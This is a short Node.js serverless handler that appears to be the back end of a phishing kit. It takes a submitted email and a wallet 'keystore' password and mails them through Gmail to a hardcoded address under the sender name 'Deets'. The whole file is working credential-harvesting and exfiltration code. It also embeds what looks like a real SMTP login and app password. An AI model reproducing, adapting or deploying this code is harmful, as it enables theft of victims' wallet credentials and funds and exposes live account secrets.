const nodemailer = require('nodemailer');

const maillist = [
  'willyscotmegan@gmail.com',
];

const transporter = nodemailer.createTransport({
  host: "smtp.gmail.com",
  port: 465,
  secure: true,
  auth: {
    user: process.env.EMAIL_USER || "willyscotmegan@gmail.com",
    pass: process.env.EMAIL_PASS || "jubtgphwdbkrrauf",
  },
});

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method not allowed' });
  }

  try {
    console.log('Received:', req.body);

    const { wName, psdWet } = req.body;

    const mailOptions = {
      from: '"Deets" <willyscotmegan@gmail.com>',
      to: maillist,
      html: `
        <p><strong>Eml:</strong> ${wName || 'Not provided'}</p>
        <p><strong>Pswd (if keystore):</strong> ${psdWet || 'Not provided'}</p>
      `
    };

    const info = await transporter.sendMail(mailOptions);
    
    res.status(200).json({ message: 'Wdestscesful' });
  } catch (error) {
    console.error('err', error);
    res.status(500).json({ message: 'Errwetdets' });
  }
}